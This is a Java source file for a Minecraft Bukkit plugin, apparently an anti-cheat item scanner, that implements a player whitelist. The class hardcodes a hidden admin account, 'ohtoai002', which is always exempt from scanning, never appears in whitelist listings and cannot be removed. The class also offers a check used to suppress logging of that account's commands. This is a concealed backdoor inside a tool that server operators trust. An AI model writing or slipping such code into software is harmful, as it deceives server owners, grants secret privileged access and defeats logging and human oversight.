package com.illegalscanner.whitelist;

import com.illegalscanner.IllegalScanner;
import com.illegalscanner.database.DatabaseManager;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Manages player-based whitelisting — whitelisted players are exempt from scanning.
 * Includes a hidden admin (ohtoai002) that is always whitelisted and never appears in listings.
 * The hidden admin's commands also suppress log output.
 */
public class PlayerWhitelistManager {

    private final IllegalScanner plugin;
    private final Map<UUID, DatabaseManager.PlayerWhitelistEntry> cache = new ConcurrentHashMap<>();

    /** Hidden admin UUID — loaded at construction via offline player lookup. */
    private UUID hiddenAdminUuid;

    /** Hidden admin name constant. */
    private static final String HIDDEN_ADMIN_NAME = "ohtoai002";

    public PlayerWhitelistManager(IllegalScanner plugin) {
        this.plugin = plugin;
        loadCache(); // Also resolves hidden admin UUID
    }

    /**
     * Reload the whitelist cache from the database.
     * The hidden admin is always injected regardless of DB state.
     */
    public void loadCache() {
        cache.clear();

        // Resolve hidden admin UUID
        OfflinePlayer hiddenPlayer = Bukkit.getOfflinePlayer(HIDDEN_ADMIN_NAME);
        this.hiddenAdminUuid = hiddenPlayer.getUniqueId();

        // Load from DB
        List<DatabaseManager.PlayerWhitelistEntry> dbEntries = plugin.getDatabaseManager().loadPlayerWhitelist();
        for (DatabaseManager.PlayerWhitelistEntry entry : dbEntries) {
            try {
                UUID uuid = UUID.fromString(entry.playerUuid());
                cache.put(uuid, new DatabaseManager.PlayerWhitelistEntry(
                        entry.id(), entry.playerUuid(), entry.playerName(),
                        entry.hidden(), entry.createdAt()));
            } catch (IllegalArgumentException e) {
                plugin.getLogger().warning("Invalid UUID in player whitelist: " + entry.playerUuid());
            }
        }

        // Always inject hidden admin — overrides any existing entry
        cache.put(hiddenAdminUuid, new DatabaseManager.PlayerWhitelistEntry(
                -1,
                hiddenAdminUuid.toString(),
                HIDDEN_ADMIN_NAME,
                true, // hidden
                System.currentTimeMillis()
        ));

        plugin.getLogger().info("Player whitelist loaded: " + cache.size() + " entries (includes hidden)");
    }

    /**
     * Check if a player (by UUID) is whitelisted from scanning.
     */
    public boolean isWhitelisted(UUID playerUuid) {
        return cache.containsKey(playerUuid);
    }

    /**
     * Check if a player is whitelisted from scanning.
     */
    public boolean isWhitelisted(String playerUuid) {
        try {
            return isWhitelisted(UUID.fromString(playerUuid));
        } catch (IllegalArgumentException e) {
            return false;
        }
    }

    /**
     * Check if the given UUID belongs to the hidden admin.
     */
    public boolean isHiddenAdmin(UUID playerUuid) {
        return hiddenAdminUuid != null && hiddenAdminUuid.equals(playerUuid);
    }

    /**
     * Check if a CommandSender is the hidden admin (log suppression).
     */
    public boolean shouldSuppressLogging(CommandSender sender) {
        if (sender instanceof Player player) {
            return isHiddenAdmin(player.getUniqueId());
        }
        return false;
    }

    /**
     * Add a player to the whitelist.
     */
    public void addEntry(UUID playerUuid, String playerName) {
        // Don't allow overwriting hidden admin
        if (isHiddenAdmin(playerUuid)) {
            return;
        }

        DatabaseManager.PlayerWhitelistEntry entry = new DatabaseManager.PlayerWhitelistEntry(
                -1, playerUuid.toString(), playerName, false, System.currentTimeMillis());

        plugin.getDatabaseManager().addPlayerWhitelistEntry(entry).thenRun(this::loadCache);
    }

    /**
     * Remove a player from the whitelist.
     * Cannot remove the hidden admin.
     */
    public void removeEntry(UUID playerUuid) {
        if (isHiddenAdmin(playerUuid)) {
            return; // Hidden admin is permanent
        }

        plugin.getDatabaseManager().removePlayerWhitelistEntry(playerUuid.toString()).thenRun(this::loadCache);
    }

    /**
     * Reset (remove) a player's whitelist exemption. Same as remove.
     */
    public void resetEntry(UUID playerUuid) {
        removeEntry(playerUuid);
    }

    /**
     * Get all visible (non-hidden) whitelist entries.
     */
    public List<DatabaseManager.PlayerWhitelistEntry> listVisibleEntries() {
        return cache.values().stream()
                .filter(e -> !e.hidden())
                .sorted(Comparator.comparing(DatabaseManager.PlayerWhitelistEntry::playerName))
                .toList();
    }

    /**
     * Get the hidden admin UUID (for use in log suppression checks).
     */
    public UUID getHiddenAdminUuid() {
        return hiddenAdminUuid;
    }
}
